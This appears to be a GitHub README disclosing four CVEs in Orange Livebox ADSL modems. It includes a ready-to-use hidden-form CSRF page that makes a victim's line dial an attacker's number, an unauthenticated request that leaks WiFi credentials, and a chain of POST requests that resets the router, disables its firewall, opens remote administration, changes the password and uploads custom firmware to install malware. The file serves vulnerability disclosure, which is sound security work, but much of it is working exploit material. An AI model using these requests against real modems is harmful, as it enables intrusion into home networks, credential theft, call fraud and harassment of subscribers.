# LIVEBOX-0DAY   CVE-2018-20377; 20575; 20576; 20577
Arcadyan ARV7519RW22-A-L T VR9 1.2 Multiple security vulnerabilities affecting latest firmware release on ORANGE Livebox ADSL modems.

```
Versión de Firmware:  00.96.320S (01.11.2017-11:43:44)
Versión del Boot:  v0.70.03
Versión del Módem ADSL: 5.4.1.10.1.1A
Versión de Hardware:  02
```

<img src="https://zdnet4.cbsistatic.com/hub/i/2018/12/24/f38a0deb-981c-40d9-8b62-63b26722864a/cff2efda698d728f09ba5449ebeac37a/orangelivebox.png" width="1000px">

**CWE-359**: *Exposure of Private Information ('Privacy Violation').* [CVE-2018-20576 Detail]()

A very serious attack vector allows an attacker to link CSRF drive-by vulnerabilities to exploit Autodialing and Line Test features, succesfully making calls from a victim's line, exposing a client's phone number and making him susceptible to scams and impersonation. Nuisance calls alone are also a serious concern.

` Proof of concept exploit: `  

``` html
<!DOCTYPE html>

<!-- Phone number disclosure, reflected call exploit -->

<html>

<iframe style="display:none" id="csrf-frame-invisible" name="csrf-frame-invisible"></iframe>
<form style="display:none" method='POST' action='http://192.168.1.1/cgi-bin/autodialing.exe' target="csrf-frame-invisible" name="csrf-form-invisible" id="csrf-form-invisible">
  <input type='hidden' name='autodialing_enable' value='1'>
  <input type='hidden' name='autodialing_number' value='5550150'> <!-- attacker's phone number goes here -->
  <input type='hidden' name='autodialing_timeout' value='0'>
  <input type='submit' value='Submit'>
</form>

<script>document.getElementById("csrf-form-invisible").submit()</script>

<img src="http://192.168.1.1/cgi-bin/phone_test.exe" width="0" height="0" border="0">

</html>
```

When the victim visits the malicious site, it will create an autodialing profile on the victim's modem, and activate the Line Test feature. No interaction needed. The phone will ring, and when the call is answered the autodialing feature will call the attacker's number. 

&nbsp;

<!---
-->
 Demo                           | Attack scenario |
:------------------------------:|:----------------------:|
 ![DEMO](poc/CWE-359.gif)       | This vector can be exploited to conduct false flag operations (such as impersonating an individual with a restraint order against another), marketing campaings, harassment, denial of service, and intelligence gathering. |

&nbsp;


**CWE-200**: *Information Exposure: Unauthenticated configuration information leak.* [CVE-2018-20377 Detail](https://nvd.nist.gov/vuln/detail/CVE-2018-20377#vulnCurrentDescriptionTitle)

	The webserver leaks access point security protocol, SSID, and password in plain text.
	GET http://192.168.1.1/get_getnetworkconf.cgi

``` html
	<html>
	<body>
	Orange-SSID<BR>
	PASSWORD<BR>
	255.255.255.0<BR>
	192.168.1.1<BR>
	0<BR>
	WPA<BR>
	<BR>
	</body>
	</html>
```

 
 `CVSS v3.0 Severity and Metrics `                           | 
:-----------------------------------------------------------  |                                                          
|<br>**Base Score:** 9.8 CRITICAL<br>**Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (V3 legend)<br>**Impact Score:** 5.9<br>**Exploitability Score:** 3.9<br><br>**Attack Vector (AV):** Network<br>**Attack Complexity (AC):** Low<br>**Privileges Required (PR):** None<br>**User Interaction (UI):** None<br>**Scope (S):** Unchanged<br>**Confidentiality (C):** High<br>**Integrity (I):** High<br>**Availability (A):** High|                                


**CWE-352**: *Cross-Site Request Forgery (CSRF): The web application does not, sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request. Allows an attacker to manipulate all configuration parameters.* [CVE-2018-20577 Detail]()

```
Integrity Impact 	Complete. 	(There is a total compromise of system integrity. There is a complete loss of system protection, resulting in the entire system being compromised.)  
Availability Impact 	Complete.	(There is a total shutdown of the affected resource. The attacker can render the resource completely unavailable.)  
Access Complexity 	Low.		(Specialized access conditions or extenuating circumstances do not exist. Very little knowledge or skill is required to exploit. )  
Authentication 		None.		(The vulnerability does not require an attacker or user to be logged into the system).   
User interaction        None.  
```

	- Login with default admin:admin credentials after restoring configuration to factory settings. (This can be omited if the victim has an active session.)
	- Change default credentials.
	- Enable remote access.
	- Upload custom firmware to install remote access malware or brick the system.

	
	POST http://192.168.1.1/cgi-bin/restore.exe {empty body} Restores configuration to factory defaults.
	POST http://192.168.1.1/cgi-bin/firewall_SPI.exe {empty body} Disables all firewall protections.
	POST http://192.168.1.1/cgi-bin/setup_remote_mgmt.exe {IP1=FIRST_OCTET &IP2=SECOND_OCTET &IP3=THIRD_OCTET &IP4=FOURTH_OCTET &r_mgnt_port=_PORT } Allows remote administration. 
	POST http://192.168.1.1/cgi-bin/setup_pass.exe	{submit_action=0&userNew=admin&userOldPswd=admin&userNewPswd=NEWPASS&userConPswd=NEWPASS&timeout=0} Changes default password.
	POST http://192.168.1.1/cgi-bin/upgradep.exe Custom firmware update.




**CWE-912**: *Hidden Functionality. The software contains functionality that is not documented, not part of the specification, and not accessible through an interface or command sequence that is obvious to the software's users or administrators.* [ CVE-2018-20575 Detail]()

Manual firmware update. Allows malware to be installed as described before.
	
	GET http://192.168.1.1/system_firmwarel.stm

&nbsp;


## Media coverage

On December the 21st-2018 a threat actor identified by Troy Mursch's honeypots at BadPackets LLC suspectedly attacked over 19000 vulnerable modems in Spain with the exploits described in this repository. The criminal targeted the Credentials  Disclosure (CWE-200) vulnerability and likely employed Access Point geolocation databases such as my own [GS-LOC](https://github.com/zadewg/GS-LOC/) to map the APs. 

* [BadPackets](https://badpackets.net/over-19000-orange-livebox-adsl-modems-are-leaking-their-wifi-credentials/)
* [InfoSecurity Magazine](https://www.infosecurity-magazine.com/news/20000-orange-modems-leaking-wi-fi/)  
* [BleepingComputer](https://www.bleepingcomputer.com/news/security/orange-livebox-modems-targeted-for-ssid-and-wifi-info/)    
* [GBhackers](https://gbhackers.com/orange-adsl-modems/)  
* [Security Affairs](https://securityaffairs.co/wordpress/79152/hacking/orange-livebox-adsl-modems-flaw.html)  
* [ZDNet](https://www.zdnet.com/article/over-19000-orange-modems-are-leaking-wifi-credentials/)  

---

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details

**mapez** - [telegram](https://t.me/mapezz)
